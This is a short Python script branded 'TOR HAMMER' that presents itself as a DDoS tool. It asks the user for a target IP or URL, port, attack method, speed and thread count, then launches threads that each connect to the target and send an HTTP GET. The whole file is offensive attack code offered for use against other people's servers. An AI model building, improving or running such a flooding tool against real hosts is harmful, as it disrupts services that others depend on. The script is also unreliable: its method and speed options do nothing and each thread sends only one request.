import socket
import threading
import os

def clear_screen():
    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')

def print_banner():
    print("""
\033[31m████████╗ ██████╗ ██████╗     ██╗  ██╗ █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ 
╚══██╔══╝██╔═══██╗██╔══██╗    ██║  ██║██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
   ██║   ██║   ██║██████╔╝    ███████║███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
   ██║   ██║   ██║██╔══██╗    ██╔══██║██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
   ██║   ╚██████╔╝██║  ██║    ██║  ██║██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                    
\033[0m""")

def ddos(target_host, target_port, method, speed):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host, target_port))
        print(f"\033[32mConnection to {target_host} on port {target_port} successful. Method: {method}, Speed: {speed}\033[0m")
        s.send(("GET / HTTP/1.1\r\n").encode('ascii'))
        s.send(("Host: " + target_host + "\r\n\r\n").encode('ascii'))
        s.close()
    except Exception as e:
        print(f"\033[31mConnection error to {target_host} on port {target_port}: {e}\033[0m")

def help_command():
    print("""
\033[31mUsage:
- To attack by IP address: python ddos.py ip
- To attack by URL: python ddos.py url
- Use 'help' command to display this help message.
\033[0m""")

clear_screen()
print_banner()
help_command()
target_type = input("\033[31mEnter 'ip' to attack by IP address, or 'url' to attack by URL: \033[0m")

if target_type == 'ip':
    target_host = input("\033[31mEnter the target IP address: \033[0m")
elif target_type == 'url':
    target_host = input("\033[31mEnter the target URL: \033[0m")
else:
    print("\033[31mInvalid command. Use 'ip' or 'url' to specify the target type.\033[0m")
    exit()

target_port = int(input("\033[31mEnter the target port (e.g., 80): \033[0m"))
method = input("\033[31mEnter the attack method (e.g., UDP, TCP): \033[0m")
speed = input("\033[31mEnter the attack speed (e.g., low, medium, high): \033[0m")
threads_count = int(input("\033[31mEnter the number of threads: \033[0m"))

clear_screen()
print_banner()

for _ in range(threads_count):
    threading.Thread(target=ddos, args=(target_host, target_port, method, speed)).start()
